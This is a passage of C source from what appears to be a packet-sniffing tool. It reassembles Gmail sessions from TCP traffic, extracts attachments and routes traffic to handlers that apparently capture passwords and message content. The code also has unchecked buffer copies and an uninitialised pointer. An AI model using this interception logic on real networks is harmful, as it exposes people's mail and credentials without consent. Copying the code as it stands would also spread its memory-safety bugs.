			mail_info->ack_seq = ack_seq;
			char *p1, *p2;
			int len_id;
			p1 = strstr(data, "att&th=");
			if(p1 == NULL)
				return -1;
			p1+=7;
			p2 = strstr(p1, "&attid=");
			if(p2 == NULL)
				return -1;
			len_id = p2 - p1;
			if (len_id < 0 || len_id > MAX_ID_LEN)
				return -1;
			memcpy(mail_info->mail_id, p1, len_id);
			mail_info->mail_id[len_id] = 0;
			mail_info->is_writing = 0;
		}
	}
	else
	{
		if (!strncmp(data, "HTTP/1.1 200 OK", 15))
		{
			char *p1;
			p1 = NULL;
			mail_info->recive_length = 0;
			
			char *p = strstr(data, "\r\nContent-Length: ");
			if (p == NULL)
			{
				mail_info->recive_length = 5000;
				mail_info->is_have_contentlength = 0;
			}
			else
			{
				p += 18;
				while( *p != '\r') 
				{
					mail_info->recive_length = mail_info->recive_length * 10 + (*p - '0');
					p++;
				}
				mail_info->is_have_contentlength = 1;
			}
			mail_info->is_chunked = judge_chunk(data);
			mail_info->attach_len = mail_info->recive_length;
		
			if (mail_info->recive_length <= 0)
			{
				return -1;
			}
			
			mail_info->recive_length += 1000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL) 
			{
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			mail_info->http_seq = seq; 
			
			p1 = strstr(data, "\r\n\r\n");
			if(p1 == NULL)
			{
				return -1;
			}
			p1+=4;
			mail_info->source_seq = seq + (p1 - data);
			memcpy(mail_info->recive_data, data, datalen);
			data_length += datalen - (p1 - data);
		}
		else 
		{
			if((mail_info->recive_data != NULL) && datalen)
			{
				off_seq = seq-mail_info->http_seq;
				range = off_seq+datalen;

				if (range>mail_info->recive_length)
				{
					mail_info->recive_data = (char *)realloc(mail_info->recive_data,range+1);
					if(mail_info->recive_data == NULL)
						return -1;
					mail_info->recive_length=range;
					memcpy(mail_info->recive_data + off_seq, data, datalen);
					data_length += datalen;
				}
				else
				{
					memcpy(mail_info->recive_data+off_seq, data, datalen);
					data_length += datalen;
				}

			}
	
		}
		if(mail_info->recive_data != NULL)
		{
			if(tcp->fin || (datalen>=2&&!memcmp(data + datalen - 2, "\0\0", 2)) || mail_info->recive_length-1000 == data_length)
			{
				mail_info->is_complished = 1;
				data_length = 0;
				if(!mail_info->is_have_contentlength)
				{
					mail_info->recive_length = seq-mail_info->source_seq+1000+datalen;
				}
				write_attach_down_2(mail_info, mail_info->attach_len, mail_info->is_chunked);
				del_mail_node(mail_info);
			}
		} 
	}

	return 0;
}


void analyse_gmail(void *tmp, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s, int mora)
{
	Mail_info *mail_info;
	Attach_info *attach_info;
	unsigned int lowtype; 
	int result = 0;

	if(!mora)
	{
		mail_info = (Mail_info*)tmp;
		lowtype = mail_info->mail_type;
		lowtype = lowtype&0X00FF;

		switch(lowtype)
		{
			case 0x01:
				result = analyse_gmail_psword(mail_info, data, datalen, tcp, is_b_s);
				break;
			case 0x12:
				result = analyse_gmail_content(mail_info, data, datalen, tcp, is_b_s);
				break;
			case 0x14:
				result = analyse_gmail_content1(mail_info, data, datalen, tcp, is_b_s);
				break;
			case 0x31:
				result = analyse_gmail_attach_recive(mail_info, data, datalen, tcp, is_b_s);
				break;
			case 0x22:
				result = analyse_gmail_recive(mail_info, data, datalen, tcp, is_b_s);
				break;
			default :
			    break;
		}

		if(result == -1)
		{
			delete_mail_info(mail_info);
		}

		if(lowtype == 0x13)
		{		
			Attach_info *attach_info = (Attach_info *)tmp;
			analyse_gmail_attach(attach_info, mail_info, data, datalen, tcp, is_b_s); 
		}
		
	}
	else
	{
	    attach_info=(Attach_info *)tmp;
		lowtype=attach_info->attach_type;
		lowtype = lowtype & 0x00FF;
		switch(lowtype) 
		{
			case 0x13:
				analyse_gmail_attach(attach_info, mail_info, data,datalen,tcp,is_b_s);
				break;
			default :
				break;
		}
	}
		
}


